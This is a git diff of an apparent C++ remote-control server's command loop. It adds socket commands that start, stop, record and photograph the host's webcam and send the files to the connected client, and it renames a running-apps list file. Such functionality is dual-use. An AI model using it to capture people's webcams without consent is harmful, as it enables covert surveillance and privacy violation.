@@ -73,8 +73,8 @@ int main()
         if (receivedMessage.substr(0, 8) == "list app")
         {
             std::vector<ServerHandler::ProcessInfo> applications = server.listRunningApplications();
-            server.saveApplicationsToFile(applications, "applications_list.txt");
-            if (server.sendFile(clientSocket, L"applications_list.txt"))
+            server.saveApplicationsToFile(applications, "apps_list.txt");
+            if (server.sendFile(clientSocket, L"apps_list.txt"))
             {
                 std::cerr << "File sent to client!" << std::endl;
             }
@@ -156,7 +156,27 @@ int main()
         }
         else if (receivedMessage.substr(0, 9) == "start cam")
         {
-            server.startWebcam(clientSocket);
+            server.startWebcam();
+        }
+        else if (receivedMessage.substr(0, 8) == "stop cam")
+        {
+            server.stopWebcam();
+        }
+        else if (receivedMessage.substr(0, 10) == "record cam")
+        {
+            std::wstring filename = L"recorded_cam.avi";
+            if (server.recordWebcam() && server.sendFile(clientSocket, filename))
+            {
+                std::cerr << "File sent to client!" << std::endl;
+            }
+        }
+        else if (receivedMessage.substr(0, 11) == "capture cam")
+        {
+            std::wstring filename = L"captured_cam.jpg";
+            if (server.takeWebcamShot() && server.sendFile(clientSocket, filename))
+            {
+                std::cerr << "File sent to client!" << std::endl;
+            }
         }
         else if (receivedMessage.substr(0, 3) == "end")
         {
